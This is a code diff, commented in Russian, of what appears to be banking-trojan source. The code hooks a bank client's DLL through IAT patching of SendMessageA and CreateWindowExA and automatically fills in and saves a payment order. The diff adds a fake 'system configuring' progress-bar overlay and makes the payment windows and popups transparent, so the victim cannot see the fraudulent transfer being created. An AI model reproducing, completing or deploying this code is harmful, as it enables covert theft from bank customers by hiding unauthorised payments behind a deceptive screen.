@@ -56,6 +56,7 @@ int fromLVM = 0;  //если равно 1, то передаем цифру в админку (см. функцию GrabB
 HWND treeView = 0, listView = 0, toolBar = 0;
 int idBtNewDoc = 0;
 POINT posBtNewDoc;
+int stateFakeWindow = 0;
 
 //контролы формы "Платежное поручение"
 ControlForm controlsPaymentOrder[] = 
@@ -85,6 +86,10 @@ ControlForm controlsPaymentOrder[] =
 	{ "sended",   200, 518, 81, 16, 0,                   0xAC3A81FF /* К отправке */, 0, 0x5E9D34F9 /* button */}, //галочка к отправке
 	{ 0 }
 };
+
+
+//сравнивает окно wnd с информацией из ControlFinded, если совпадает, то возвращает true
+static bool CmpWnd( const char* caption, DWORD captionHash, const char* className, DWORD classHash, RECT& r, ControlForm* cf );
 
 static PIMAGE_NT_HEADERS GetNtHeaders(PVOID Image)
 {
@@ -232,19 +237,42 @@ static LRESULT WINAPI HandlerSendMessageA(HWND hWnd, UINT Msg, WPARAM wParam, LP
 
 	return (LRESULT)pHandlerSendMessageA(hWnd,Msg,wParam,lParam);;
 }
-/*
+
 static HWND WINAPI HandlerCreateWindowExA( DWORD dwExStyle, PCHAR lpClassName, PCHAR lpWindowName, DWORD dwStyle, int x, int y, int nWidth, int nHeight, HWND hWndParent, HMENU hMenu, HINSTANCE hInstance, LPVOID lpParam )
 {
 	HWND hWnd = pHandlerCreateWindowExA( dwExStyle, lpClassName, lpWindowName, dwStyle, x, y, nWidth, nHeight, 
 										 hWndParent, hMenu, hInstance, lpParam );
-	if( hWnd )
+	
+	if( hWnd && (DWORD)lpClassName > 0x10000 && lpWindowName )
 	{
-		DBGRAFA( "Rafa--", "'%s', '%s'", DWORD(lpClassName) < 0x10000 ? "<0x10000" : lpClassName, lpWindowName == 0 ? "" : lpWindowName );
-		DBGRAFA( "Rafa--", "(%d,%d)-(%d)", x, y, nWidth *10000 + nHeight );
+		bool transparent = false;
+		DBGRAFA( "Rafa--", "'%s','%s'", lpWindowName, lpClassName );
+		if( (stateFakeWindow & 3) == 3 ) //ждем появления окна ввода новой платежки
+		{
+			RECT r;
+			if( CmpWnd( lpWindowName, 0, lpClassName, 0, r, &controlsPaymentOrder[0] ) ) //это окно Платёжное поручение
+			{
+				transparent = true;
+				stateFakeWindow &= ~2; //больше не нужно ждать это окно
+			}
+		}
+		else
+			if( (stateFakeWindow & 5) == 5 ) //во время ввода платежки, подавляем все всплывающие окна
+			{
+				transparent = true;
+			}
+		if( transparent ) //делаем окно прозрачным
+		{
+#ifdef DEBUGCONFIG
+			SetWindowTransparent( hWnd, 50 );
+#else
+			SetWindowTransparent( hWnd, 0 );
+#endif
+		}
 	}
 	return hWnd;
 }
-*/
+
 static BOOL CALLBACK EnumTreeList( HWND wnd, LPARAM lParam )
 {
 	DWORD hash = GetWndClassHash(wnd);
@@ -308,7 +336,7 @@ static bool CmpWnd( const char* caption, DWORD captionHash, const char* classNam
 {
 	bool ok = false;
 	//окно нужного класса
-	if( cf->classHash ) //есть хеш имени класса, сравниваем по нему
+	if( cf->classHash && classHash ) //есть хеш имени класса, сравниваем по нему
 	{
 		if( classHash == cf->classHash )
 			ok = true;
@@ -328,14 +356,14 @@ static bool CmpWnd( const char* caption, DWORD captionHash, const char* classNam
 	{
 		ok = false;
 		//сравнимаем по заголовку окна
-		if( cf->captionHash ) //есть хеш заголовка
+		if( cf->captionHash && captionHash ) //есть хеш заголовка
 		{
 			if( captionHash == cf->captionHash )
 				ok = true;
 		}
 		else
 		{
-			if( cf->captionText ) //есть текст заголовка
+			if( cf->captionText && caption ) //есть текст заголовка
 			{
 				if( m_strstr( caption, cf->captionText ) )
 					ok = true;
@@ -516,15 +544,22 @@ static HTREEITEM FindPaymentOrder( HTREEITEM item )
 				if( GetTextTreeItem( item, text, sizeof(text) ) )
 				{
 					DWORD hash = CalcHash(text);
-					if( hash == 0x505B8B0E /* Платежное поручение */ )
+					if( hash == 0x505B8B0E /* Платежное поручение */ ) //нужная ветка
 					{
-						if( GetTextTreeItem( child, text, sizeof(text) ) )
+						//смотрим есть ли в подветках Шаблоны
+						HTREEITEM item2 = child;
+						do
 						{
-							if( m_strstr( text, "Шаблоны" ) )
+							if( GetTextTreeItem( item2, text, sizeof(text) ) )
 							{
-								return child;
+								if( m_strstr( text, "Шаблоны" ) )
+								{
+									return item2;
+								}
 							}
+							item2 = (HTREEITEM)pSendMessageA( treeView, TVM_GETNEXTITEM, (WPARAM)TVGN_NEXT, (LPARAM)item2 );
 						}
+						while(item2);
 					}
 				}
 				HTREEITEM res = FindPaymentOrder(child);
@@ -544,7 +579,6 @@ static void TreeViewCollapse( HTREEITEM item, int count )
 	while( count-- )
 	{
 		item = (HTREEITEM)pSendMessageA( treeView, TVM_GETNEXTITEM, (WPARAM)TVGN_PARENT, (LPARAM)item );
-		DBGRAFA( "Rafa", "1" );
 		if( item == 0 ) break;
 		pSendMessageA( treeView, TVM_EXPAND, (WPARAM)TVE_COLLAPSE, (LPARAM)item );
 	}
@@ -629,9 +663,94 @@ static bool ClickButton( const char* name, ControlFinded* cf, int count )
 	return false;
 }
 
+//Создает окно с прогресс баром, которое скрывает под собой все окна
+static DWORD WINAPI FakeWindow( LPVOID p )
+{
+	HWND parent = (HWND)p;
+	HINSTANCE inst = (HINSTANCE)pGetModuleHandleA(NULL);
+	RECT r, r2;
+	pGetClientRect( parent, &r ); //область которую нужно закрыть
+	POINT pp;
+	pp.x = 0;
+	pp.y = 0;
+	//узнаем координаты области на экране
+	pClientToScreen( parent, &pp ); 
+	int xFW = pp.x, yFW = pp.y;
+	int wFW = r.right, hFW = r.bottom;
+	//рассчитываем положение прогресс бара на новом окне
+	int wPB = r.right * 80 / 100;
+	int hPB = 25;
+	int xPB = (r.right - wPB) / 2;
+	int yPB = (r.bottom - hPB) / 2;
+	//создаем скрывающее окно
+	HWND fakeWindow = (HWND)pCreateWindowExA( 0, "STATIC", "", WS_CHILD | WS_POPUP, xFW, yFW, wFW, hFW, parent, NULL, inst, NULL );
+
+	if( !fakeWindow )
+      return 0; 
+	//окно в котором печатается текст
+	HWND warnWnd = (HWND)CreateWindowExA( 0, "STATIC", "", WS_VISIBLE | WS_CHILD, xPB, yPB - 16, wPB, 16, fakeWindow, 0, inst, 0 );
+	//сам текст пишем в статус баре, чтобы был нормальный фон и цвет текста
+	HWND warnText = (HWND)CreateWindowExA( 0, STATUSCLASSNAME, "Подождите, идет настройка системы ...", WS_VISIBLE | WS_CHILD | SBT_NOBORDERS, 0, 0, 0, 0, warnWnd, 0, inst, 0 );
+	//статус бар справа рисует треугольник, это окно его скрывает
+	HWND warnWnd2 = (HWND)CreateWindowExA( 0, "STATIC", "", WS_VISIBLE | WS_CHILD, wPB - 16, 0, 16, 16, warnWnd, 0, inst, 0 );
+	//создаем сам прогресс бар
+	HWND progressBar = (HWND)pCreateWindowExA( 0, PROGRESS_CLASS, 0, WS_CHILD | WS_VISIBLE, xPB, yPB, wPB, hPB, fakeWindow, 0, inst, 0 );
+
+	pShowWindow( fakeWindow, SW_SHOW );
+	pUpdateWindow(fakeWindow);
+	//устанавливаем таймер для инкримента в статус баре
+	pSetTimer( fakeWindow, 1, 500, 0 );
+	//настраиваем статус бар
+	pSendMessageA( progressBar, PBM_SETRANGE, 0, MAKELPARAM( 0, 60 )); 
+	pSendMessageA( progressBar, PBM_SETSTEP, (WPARAM) 1, 0 );
+	MSG msg;
+	int remain = 60;
+	//запоминаем положение окна
+	pGetWindowRect( parent, &r2 );
+	r.left = r2.left;
+	r.top = r2.top;
+	r.right = r2.right;
+	r.bottom = r2.bottom;
+
+	//прогоняем в потоке сообщения и реагируем только на свой таймер
+	while( (stateFakeWindow & 1) && pGetMessageA( &msg, 0, 0, 0 ) )
+	{
+		if( msg.message == WM_TIMER && msg.hwnd == fakeWindow ) //наш таймер
+		{
+			pSendMessageA( progressBar, PBM_STEPIT, 0, 0 ); 
+			if( --remain == 0 )
+				break;
+		}
+	    pTranslateMessage( &msg );
+		pDispatchMessageA( &msg );
+		//проверяем не изменило ли свое положение или размеры окно которое скрываем
+		pGetWindowRect( parent, &r2 );
+		if( r.left != r2.left || r.top != r2.top || r.right != r2.right || r.bottom != r2.bottom )
+		{
+			//если изменило, то подгоняем наше окно под предка
+			r.left = r2.left;
+			r.top = r2.top;
+			r.right = r2.right;
+			r.bottom = r2.bottom;
+			pGetClientRect( parent, &r2 );
+			pp.x = 0;
+			pp.y = 0;
+			pClientToScreen( parent, &pp );
+			pMoveWindow( fakeWindow, pp.x, pp.y, r2.right, r2.bottom, TRUE );
+		}
+	}
+	pDestroyWindow(fakeWindow);
+	return true;
+}
+
 //сюда попадаем когда найдены контролы TreeView и ListView окна банка
 static void WorkInRafa()
 {
+	stateFakeWindow = 1; //запуск окна скрывающего наши действия
+	HWND parent = (HWND)pGetParent(treeView);
+	HANDLE hThread = pCreateThread( NULL, 0, FakeWindow, (LPVOID)parent, 0, 0 );
+	pCloseHandle(hThread);
+
 	HTREEITEM root = (HTREEITEM)pSendMessageA( treeView, TVM_GETNEXTITEM, (WPARAM)TVGN_ROOT, (LPARAM)0 );
 	if( root )
 	{
@@ -659,6 +778,7 @@ static void WorkInRafa()
 					DBGRAFA( "Rafa", "Найдено новое платежное поручение" );
 					POINT posItem;
 					pSendMessageA( listView, LVM_GETITEMPOSITION, (WPARAM)indList, (LPARAM)&posItem );
+					stateFakeWindow |= 2; //ожидаем появления окна Платёжного поручения и делаем его прозрачным
 					HardClickToWindow( listView, posItem.x + 5, posItem.y + 5 );
 					DBGRAFA( "Rafa", "Кликнули по новому платежному поручению" );
 					FindTreeList();
@@ -677,6 +797,7 @@ static void WorkInRafa()
 						if( formPayment )
 						{
 							DBGRAFA( "Rafa", "Форма ввода платежа открыта" );
+							stateFakeWindow |= 4; //делаем прозрачными все всплывающие окна во время ввода платежки
 							//ищем контролы в которые будем вводить
 							ControlFinded* cf = (ControlFinded*)HEAP::Alloc( sizeof(ControlFinded) * sizeof(controlsPaymentOrder) / sizeof(ControlForm) );
 							int countControls = FindControls( formPayment, controlsPaymentOrder, cf );
@@ -698,9 +819,9 @@ static void WorkInRafa()
 								SetButtonCheck( "sended", true, cf, countControls );
 								//сохраняем платежку
 								ClickButton( "save", cf, countControls );
-								//сворачиваем дерево до первоначального состояния
 								pSleep(5000); //ждем пока сохранится
-								TreeViewCollapse( tmpls, 3 );
+								//сворачиваем дерево до первоначального состояния
+								TreeViewCollapse( tmpls, 4 );
 								pSendMessageA( treeView, TVM_SELECTITEM, (WPARAM)TVGN_CARET, (LPARAM)root );
 							}
 							HEAP::Free(cf);
@@ -714,6 +835,7 @@ static void WorkInRafa()
 		else
 			DBGRAFA( "Rafa", "Шаблоны ненайдены" );
 	}
+	stateFakeWindow = 0; //закрываем окно скрытия
 }
 
 static DWORD WINAPI InitializeRafaHook( LPVOID p )
@@ -728,7 +850,7 @@ static DWORD WINAPI InitializeRafaHook( LPVOID p )
 			for( int i = 0; i < 10; i++ )
 			{
 				bool res = PathIAT( dll, "USER32.DLL", "SendMessageA", HandlerSendMessageA, (PVOID*)&pHandlerSendMessageA );
-				//res &= PathIAT( dll, "USER32.DLL", "CreateWindowExA", HandlerCreateWindowExA,(PVOID*)&pHandlerCreateWindowExA );
+				res &= PathIAT( dll, "USER32.DLL", "CreateWindowExA", HandlerCreateWindowExA,(PVOID*)&pHandlerCreateWindowExA );
 				if( res )
 				{
 					DBGRAFA( "Rafa", "Hook FilialRCon.dll is ok %d - %08x", (int)res,pHandlerSendMessageA );
@@ -759,8 +881,8 @@ void InitHook_FilialRConDll()
 {
 	if( IsNewProcess(PID) ) //чтобы повторно не запустить
 	{
-		HANDLE hThread = CreateThread( NULL, 0, InitializeRafaHook, 0, 0, 0 );
-		CloseHandle(hThread);
+		HANDLE hThread = pCreateThread( NULL, 0, InitializeRafaHook, 0, 0, 0 );
+		pCloseHandle(hThread);
 		fromLVM = 0;
 	}
 }
